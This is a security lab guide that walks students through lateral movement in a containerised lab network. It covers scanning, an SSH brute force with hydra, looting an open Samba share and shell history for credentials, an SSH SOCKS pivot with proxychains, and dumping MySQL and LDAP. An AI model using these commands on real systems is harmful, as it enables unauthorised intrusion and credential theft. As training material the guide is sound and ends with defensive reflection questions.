# Lateral Movement — Lab Guide

> **Using an AI assistant?** Make it a thinking partner, not an autopilot — and never run a command you
> can't explain. The series guide **[Learning with AI](https://github.com/michael-borck/security-labs/blob/main/LEARNING-WITH-AI.md)**
> shows how, including how to repeat each lab until you don't need the assistant at all.

## Lab Scenario

You have a foothold on the edge of a corporate network: an attack box called
**secutils**, sitting on the **corp** segment (172.20.1.0/24). From here you can
see a workstation and a couple of public web apps — and nothing else.

But you know the good stuff is deeper in. There is an **internal** segment
(172.20.2.0/24) running a directory server, a database, and a legacy telnet
service — but you cannot route to any of it. There is no path from secutils to
those hosts.

Except one. The corporate **workstation** is dual-homed — it has a leg on corp
*and* a leg on internal. Break into it, turn it into a **pivot**, and tunnel your
tools through it. That is lateral movement, and it is the entire job today.

**Estimated time:** ~90 minutes (self-paced)

## Pre-Lab Setup

- [ ] Start the lab: `./start.sh` (macOS: double-click `start.command`; Windows: `start.bat`)
- [ ] It brings the network up and logs you **straight into the attacker box (secutils)** — a welcome banner greets you; type `labhelp` for the attack chain or `netmap` for the network map
- [ ] Confirm you're on secutils: `hostname` should print `secutils`, and `ip a` should show only a `172.20.1.10` address — one segment, corp only

Prefer raw Docker? `docker compose up -d` then `docker exec -it secutils bash`.

> **The rule of this lab:** if a command from secutils tries to reach a
> `172.20.2.x` address and hangs or fails, that is *correct*. You have not
> pivoted yet. Everything internal comes through the workstation.

---

## Phase 1: Scan the corp segment

You can only see corp (172.20.1.0/24). Start there.

Sweep the segment for live hosts:

```bash
nmap -sn 172.20.1.0/24
```

You should turn up the workstation and the two web apps. Fingerprint the
workstation — it's your way in:

```bash
nmap -sV 172.20.1.20
```

Note the open ports: **SSH (22)** and **SMB (139/445)**. Those are your two
candidate footholds. The web apps (juice-shop `:3000`, dvwa `:8080`) are
published to your host browser — open them in a browser at `http://localhost:3000`
(juice) / `http://localhost:8080` (dvwa), or run `./start.sh open juice` /
`./start.sh open dvwa` from another terminal if you want to poke at them. But the
pivot lives on the workstation.

Now prove the boundary. Try to reach an internal host directly:

```bash
nmap -Pn 172.20.2.40
```

It fails. secutils has no route to the internal segment. Good — that is the
whole reason you need a pivot.

---

## Phase 2: Get a foothold on the workstation

Two doors are open. Take whichever you like — ideally both.

### Door A — brute the SSH login

The workstation uses weak, guessable passwords. Point hydra at it:

```bash
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/pass.txt ssh://172.20.1.20
```

(Or just try the obvious ones by hand: `labuser` / `Password123`.) Once you have
a hit, log in:

```bash
ssh labuser@172.20.1.20
```

### Door B — loot the open Samba share

The workstation exports a world-readable `[shared]` share. List it, then pull
the files down:

```bash
smbclient -L //172.20.1.20 -N
smbclient //172.20.1.20/shared -N
smb: \> get notes.txt
smb: \> get credentials.txt
smb: \> get config.txt
smb: \> exit
```

Read what you grabbed:

```bash
cat notes.txt credentials.txt config.txt
```

Inside you'll find leaked secrets — an `API_KEY=abc123xyz789`, a
`DB_PASSWORD=SuperSecret123`, and hints about who logs in. Credential reuse is a
gift; hang on to everything.

Either door lands you on the workstation. Continue there.

---

## Phase 3: Discover the pivot

You're on the workstation now. Look at its network interfaces:

```bash
ip a
```

Two addresses: **172.20.1.20** (corp) *and* **172.20.2.20** (internal). This box
straddles both networks — it is the bridge you were missing.

Loot it for a map of what's on the other side:

```bash
cat ~/internal-hosts.txt
cat ~/.bash_history
```

Between the host list and the shell history you'll recover the internal targets
and their credentials:

| Host | Address | Credentials |
|------|---------|-------------|
| ldap | 172.20.2.40 | `cn=admin,dc=corp,dc=local` / `admin123` |
| mysql | 172.20.2.50 | `root` / `root123` |
| telnet | 172.20.2.60 | `telnetuser` / `Telnet123` |
| ubuntu-desktop (dev-box) | 172.20.2.30 | `developer` / `Dev2023!` |

From this shell you *can* already reach the internal hosts (you're standing on
the pivot). But the powerful move is to bring your **own** tools on secutils to
bear on that network. That's Phase 4.

---

## Phase 4: Pivot — tunnel through the workstation

Come back to secutils (type `exit` if you SSH'd in). Now open a **SOCKS proxy**
through the workstation. This one command turns the workstation into a doorway:

```bash
ssh -D 1080 labuser@172.20.1.20
```

Leave that session open. It's now listening on `localhost:1080` and forwarding
anything you send into the internal segment. secutils is pre-configured with
**proxychains** pointed at that port, so prefix your tools with `proxychains` and
they'll travel through the pivot. (Handy aliases are already set up: `scan` and
`pnmap`.)

In a second secutils shell, scan the internal segment — the one you couldn't
touch in Phase 1:

```bash
proxychains nmap -sT -Pn 172.20.2.0/24
```

Suddenly the whole internal network appears: ldap, mysql, telnet, the second
workstation. You didn't move your attack box an inch — you moved *through* the
workstation.

> Use `-sT` (TCP connect) with proxychains — SOCKS can't carry the raw SYN scan
> that nmap runs by default.

---

## Phase 5: Compromise the internal services

With the tunnel up and the credentials from Phase 3, loot the internal segment.
Everything below runs from secutils, prefixed with `proxychains`.

### MySQL

```bash
proxychains mysql -h 172.20.2.50 -u root -proot123
```

```sql
SHOW DATABASES;
USE testdb;
SHOW TABLES;
SELECT * FROM users;
```

### LDAP

```bash
proxychains ldapsearch -x -H ldap://172.20.2.40 -D "cn=admin,dc=corp,dc=local" -w admin123 -b "dc=corp,dc=local"
```

Dump the directory and note the accounts and any secrets stored on the objects.

### Telnet

```bash
proxychains telnet 172.20.2.60
```

Log in as `telnetuser` / `Telnet123`. Watch how everything — including your
password — crosses the wire in cleartext. That's why telnet is a finding, not a
service.

### ubuntu-desktop (the second workstation)

```bash
proxychains ssh developer@172.20.2.30
```

Password `Dev2023!`. Once in, sweep for stored secrets:

```bash
cat ~/config.ini
cat ~/credentials.txt
find /home -name "*.ini" -o -name "*.txt" 2>/dev/null
```

`config.ini` hands you the MySQL credentials all over again — the same secret,
reused across hosts, is exactly how real intrusions snowball from one box to the
whole network.

You've now gone from a single reachable host on corp all the way into every
internal service. That chain — foothold → pivot → tunnel → loot — is lateral
movement.

---

## Reflection

Think through these as you go; they're the point of the exercise, not homework:

- Which foothold was easier — brute-forcing SSH or reading the open share? Why
  do both exist on the same box?
- The workstation being dual-homed is what made everything else possible. How
  would you *segment* a real network so a single compromised host can't bridge
  to the crown jewels?
- You saw the same password reused across the share, mysql, and ubuntu-desktop.
  What controls stop credential reuse from turning one foothold into total
  compromise?
- A defender watching this network — what would the pivot look like to them?
  (Think: an SSH session that suddenly sources scans and DB logins for the whole
  internal subnet.)

---

## Lab Cleanup

When you're finished:

- [ ] Close any open `ssh -D` tunnel (`exit` the session)
- [ ] Stop the lab: `exit` the secutils shell and answer `y` to the shutdown prompt, or run `docker compose down`

## Going further — Incident Zero

Enjoyed owning the network? *Incident Zero*'s Hardening and Incident Response
modules put you on the other side — segment the network, kill the credential
reuse, and catch the pivot you just pulled off, the same tradecraft played as a
game. ([Incident Zero](https://incidentzero.retroverse.studio/) — free, print-and-play.)
